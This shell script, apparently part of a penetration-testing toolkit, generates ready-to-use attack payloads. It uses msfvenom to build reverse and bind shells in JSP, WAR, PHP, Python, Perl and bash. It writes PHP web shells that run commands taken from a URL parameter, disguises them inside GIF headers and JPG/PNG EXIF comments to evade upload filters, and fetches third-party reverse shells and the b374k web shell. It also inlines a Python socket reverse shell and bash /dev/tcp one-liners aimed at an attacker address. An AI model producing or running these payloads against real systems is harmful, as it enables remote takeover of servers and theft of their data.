# Reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f raw > shell_reverse_tcp.jsp
msfvenom -p java/shell/reverse_tcp LHOST=$ip_local LPORT=$port_local -f war > shell_reverse_tcp.war

msfvenom -p php/reverse_php LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_tcp.php

# msfvenom -p php/meterpreter_reverse_tcp LHOST=$port_local LPORT=$port_local -f raw > meterpreter_reverse_tcp.php

msfvenom -p cmd/unix/reverse_python LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.py
msfvenom -p cmd/unix/reverse_perl LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.pl
msfvenom -p cmd/unix/reverse_bash LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.sh

# Bind shell
msfvenom -p java/jsp_shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f raw > shell_bind_tcp.jsp
msfvenom -p java/shell/bind_tcp LPORT=$port_remote -f war > shell_bind_tcp.war

msfvenom -p php/bind_php LPORT=$port_remote -f raw > shell_bind_tcp.php

# msfvenom -p php/meterpreter_bind_tcp LPORT=$port_remote -f raw > meterpreter_bind_tcp.php

msfvenom -p cmd/unix/bind_python LPORT=$port_remote -f raw > shell_bind_unix.py
msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl

# exec only returns the last line of the generated output.
# shell_exec returns the full output of the command, when the command finished running.
# system immediately shows all output, and is used to show text.
# passthru also returns output immediately, but is used for binary data. passthru displays raw data.

echo '<?php system($_GET["cmd"]); ?>' > system.php
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php

wget -Nq https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php

echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php

echo "GIF89;" > shell_exec.gif; cat shell_exec.php >> shell_exec.gif
echo "GIF89;" > system.gif; cat system.php >> system.gif
echo "GIF89;" > passthru.gif; cat passthru.php >> passthru.gif

# https://github.com/aureooms/pixels
wget -Nq https://github.com/aureooms/pixels/raw/master/1x1%23000000.jpg
cp 1x1%23000000.jpg shell_exec.jpg
exiftool -Comment="`cat shell_exec.php`" shell_exec.jpg
cp 1x1%23000000.jpg system.jpg
exiftool -Comment="`cat system.php`" system.jpg
cp 1x1%23000000.jpg passthru.jpg
exiftool -Comment="`cat passthru.php`" passthru.jpg
rm 1x1%23000000.jpg

wget -Nq https://github.com/aureooms/pixels/raw/master/1x1%23000000.png
cp 1x1%23000000.png shell_exec.png
exiftool -Comment="`cat shell_exec.php`" shell_exec.png
cp 1x1%23000000.png system.png
exiftool -Comment="`cat system.php`" system.png
cp 1x1%23000000.png passthru.png
exiftool -Comment="`cat passthru.php`" passthru.png
rm 1x1%23000000.png

rm pentestmonkey-perl-reverse-shell.pl
wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-perl-reverse-shell.pl
sed -i "s/1234/$port_local/g" pentestmonkey-perl-reverse-shell.pl

rm pentestmonkey-php-reverse-shell.pl
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-php-reverse-shell.pl
sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl

#wget https://github.com/pentestmonkey/php-findsock-shell/blob/master/findsock.c
#gcc -o findsock findsock.c
#wget https://raw.githubusercontent.com/pentestmonkey/php-findsock-shell/master/php-findsock-shell.php -O pentestmonkey-php-findsock-reverse-shell.pl


if [ ! -f b374k.php ]; then
    wget https://github.com/b374k/b374k/archive/v3.2.3.zip
    #TODO This fails sometimes due to API rate limiting
    #curl -s https://api.github.com/repos/b374k/b374k/releases/latest \
    # | grep "zipball_url.*zip" \
    # | cut -d : -f 2,3 \
    # | tr -d \" \
    # | tr -d , \
    # | wget -qi -O b374k.zip -
    unzip v3.2.3.zip -d b374k
    rm v3.2.3.zip
    cp b374k/b374k-3.2.3/b374k.* .
    rm -rf b374k
fi

echo "run post/windows/manage/migrate" > automigrate.rc

wget -nQ https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py

cat <<\EOT >revserse_shell.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
EOT

sed -i "s/127.0.0.1/$ip_local/g" revserse_shell.py
sed -i "s/4444/$port_local/g" revserse_shell.py
# 
